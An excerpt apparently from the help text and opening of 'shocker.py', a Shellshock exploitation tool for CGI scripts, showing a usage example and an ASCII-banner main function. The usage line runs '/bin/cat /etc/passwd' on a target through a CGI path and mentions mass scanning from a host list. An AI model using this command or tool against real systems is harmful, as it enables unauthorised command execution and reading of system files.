...
Usage examples:
python shocker.py -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
...
Scans all hosts specified in the file ./hostlist with default options
...
def main():
    fig = pyfiglet.figlet_format("Shocker", font="fuzzy")
    print(f"\n{fig}")
